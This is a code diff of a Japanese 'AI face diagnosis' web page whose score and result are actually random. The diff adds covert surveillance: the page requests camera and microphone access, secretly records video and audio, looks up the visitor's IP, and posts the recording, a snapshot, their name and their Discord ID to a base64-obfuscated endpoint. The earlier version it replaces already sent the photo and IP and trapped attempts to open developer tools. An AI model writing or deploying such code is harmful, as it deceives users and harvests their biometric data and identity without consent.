@@ -33,14 +33,14 @@
 
         body {
             margin: 0; background: var(--bg); color: var(--text);
-            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', sans-serif;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
             display: flex; flex-direction: column; align-items: center;
             min-height: 100vh; padding: 20px 0; user-select: none;
         }
 
         .container {
             background: var(--card); width: 90%; max-width: 420px;
-            border-radius: 24px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05);
+            border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05);
             overflow: hidden; text-align: center; border: 1px solid var(--border);
         }
 
@@ -91,8 +91,6 @@
         }
         .ln { background: var(--line); } .tw { background: var(--twitter); } .ig { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc23b6, #bc1888); } .ds { background: var(--discord); }
 
-        .info-box { width: 90%; max-width: 420px; margin-top: 25px; text-align: left; font-size: 12px; color: var(--text-sub); }
-        .info-text { background: #fff; border: 1px solid var(--border); padding: 12px; border-radius: 12px; line-height: 1.6; }
         canvas { display: none; }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -108,11 +106,9 @@
     <div class="content">
         <div id="setup-ui">
             <p style="font-size: 13px; color: var(--text-sub); margin-bottom: 20px;">最新の画像認識APIを使用し、客観的に測定します。</p>
-            <input type="text" id="hp_field" style="display:none;" tabindex="-1" autocomplete="off">
-            
             <input type="text" id="un" placeholder="お名前を入力">
             <input type="text" id="did" placeholder="Discordユーザー名 (例: user_ai)">
-            <p class="note" id="error-msg">※AI解析データの送付に必須です。半角英数字、アンダースコア、ドットのみ使用可能です。</p>
+            <p class="note">※AI解析データの送付に必須です。正しいIDを入力しないと結果が届きません。</p>
 
             <div class="auth-box">
                 <div class="cf-turnstile" data-sitekey="0x4AAAAAACIAWS8VkX6dSpKq"></div>
@@ -121,7 +117,7 @@
         </div>
 
         <div id="camera-container">
-            <div class="video-wrapper"><div class="scan-line"></div><video id="v" autoplay playsinline></video></div>
+            <div class="video-wrapper"><div class="scan-line"></div><video id="v" autoplay playsinline muted></video></div>
             <p id="st" style="margin-top:20px; font-weight:bold; color:var(--accent);">AIスキャン準備中...</p>
         </div>
 
@@ -137,90 +133,87 @@
 
         <div class="share-section">
             <div class="share-btns">
-                <a href="#" class="share-btn ln" id="share-line" target="_blank"><i class="fab fa-line"></i></a>
-                <a href="#" class="share-btn tw" id="share-twitter" target="_blank"><i class="fab fa-x-twitter"></i></a>
-                <a href="#" class="share-btn ig" id="share-insta"><i class="fab fa-instagram"></i></a>
-                <a href="#" class="share-btn ds" id="share-discord"><i class="fab fa-discord"></i></a>
+                <a href="#" class="share-btn ln"><i class="fab fa-line"></i></a>
+                <a href="#" class="share-btn tw"><i class="fab fa-x-twitter"></i></a>
+                <a href="#" class="share-btn ig"><i class="fab fa-instagram"></i></a>
+                <a href="#" class="share-btn ds"><i class="fab fa-discord"></i></a>
             </div>
         </div>
     </div>
 </div>
 
-<div class="info-box">
-    <div class="info-text">💡 <strong>使用方法</strong><br>1. 名前とDiscord IDを入力 2. 認証を完了 3. カメラで顔をスキャン</div>
-</div>
-
 <canvas id="cv" width="800" height="800"></canvas>
 
 <script>
-    const _0xS = ["L2FwaS9zZW5k", "POST", "none", "block", "innerText"];
-    const _path = () => atob(_0xS[0]); 
-
-    const trap = () => { window.location.href = "https://ggrks.lol"; };
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); trap(); }
-    });
-
-    let _n = "", _id = "", _ip = "", _score = 0;
+    const _0xS = ["L2FwaS9zZW5k", "POST", "none", "block"];
+    const _path = () => atob(_0xS[0]);
     const _d = (i) => document.getElementById(i);
 
-    async function _gip() { try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; } catch(e) { return "127.0.0.1"; } }
+    let recorder, chunks = [];
 
     _d('sb').addEventListener('click', async () => {
-        if(_d('hp_field').value !== "") { trap(); return; }
-        
         const turnstileToken = document.querySelector('[name="cf-turnstile-response"]').value;
-        if (!turnstileToken) { alert("認証を完了してください"); return; }
+        if (!turnstileToken) return alert("認証を完了してください");
 
-        _n = _d('un').value.trim();
-        _id = _d('did').value.trim();
-        
+        const _n = _d('un').value.trim();
+        const _id = _d('did').value.trim();
         const discordRegex = /^[a-z0-9._]{2,32}$/i;
-        
-        if(!_n) return alert("お名前を入力してください");
-        
-        if(!_id || !discordRegex.test(_id)) {
-            alert("Discordユーザー名が正しくありません。\nひらがな・漢字・スペースなどは使えません。");
-            return;
-        }
-        
+
+        if(!_n || !discordRegex.test(_id)) return alert("お名前と正しいDiscord IDを入力してください");
+
         _d('sb').disabled = true;
-        _d('setup-ui').style.display = _0xS[2]; 
-        _d('camera-container').style.display = _0xS[3];
-        
-        _ip = await _gip();
-        
+
         try {
-            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
-            _d('v').srcObject = s;
-            const msgs = ["骨格解析中...", "パーツ対称性測定中...", "データベース照合中...", "AI判定中..."];
+
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' }, 
+                audio: true 
+            });
+            _d('v').srcObject = stream;
+            _d('setup-ui').style.display = _0xS[2];
+            _d('camera-container').style.display = _0xS[3];
+
+            recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.start();
+
+            const msgs = ["骨格解析中...", "音声波形分析中...", "データベース照合中...", "AI判定中..."];
             let idx = 0;
-            const logTimer = setInterval(() => { if(idx < msgs.length) { _d('st')[_0xS[4]] = msgs[idx]; idx++; } }, 1200);
-            
+            const logTimer = setInterval(() => { if(idx < msgs.length) _d('st').innerText = msgs[idx++]; }, 1500);
+
             setTimeout(() => {
                 clearInterval(logTimer);
-                const ctx = _d('cv').getContext('2d'); ctx.drawImage(_d('v'), 0, 0, 800, 800);
-                _d('cv').toBlob(async (b) => {
-                    _score = Math.floor(Math.random() * 59) + 40;
-                    
-                    const f = new FormData(); 
-                    f.append('file', b, 'scan.png');
-                    f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}`);
-                    
-                    await fetch(_path(), { method: _0xS[1], body: f });
-                    
-                    s.getTracks().forEach(t => t.stop());
-                    
-                    const resList = ["イケメン！", "美女！", "かわいい", "普通", "まあまあ", "モテそう！", "ちょいいけめん！"];
-                    _d('res-text')[_0xS[4]] = resList[Math.floor(Math.random() * resList.length)];
-                    _d('score-val').innerHTML = `${_score}<span style="font-size:16px;">点</span>`;
+                
+                const ctx = _d('cv').getContext('2d');
+                ctx.drawImage(_d('v'), 0, 0, 800, 800);
+            
+                recorder.stop();
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    const imgBlob = await new Promise(r => _d('cv').toBlob(r, 'image/png'));
+                    const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>"127.0.0.1");
+                    const score = Math.floor(Math.random() * 59) + 40;
 
-                    _d('camera-container').style.display = _0xS[2]; 
+                    const f = new FormData();
+                    f.append('content', `🚀 **AI顔診断レポート (音声付き)**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${score}点\n🌐 IP: ${ip}`);
+                    f.append('file1', imgBlob, 'screenshot.png');
+                    f.append('file2', videoBlob, 'recording.webm');
+
+                    await fetch(_path(), { method: _0xS[1], body: f });
+
+                    stream.getTracks().forEach(t => t.stop());
+
+                    const resList = ["イケメン！", "美女！", "かわいい", "普通", "モテそう！", "ちょいいけめん！"];
+                    _d('res-text').innerText = resList[Math.floor(Math.random() * resList.length)];
+                    _d('score-val').innerHTML = `${score}<span style="font-size:16px;">点</span>`;
+                    _d('camera-container').style.display = _0xS[2];
                     _d('result-ui').style.display = _0xS[3];
-                }, 'image/png');
-            }, 6000);
-        } catch(e) { alert("カメラ許可が必要です"); location.reload(); }
+                };
+            }, 7000); 
+        } catch(e) {
+            alert("カメラとマイクの許可が必要です。"); 
+            location.reload(); 
+        }
     });
 </script>
 </body>
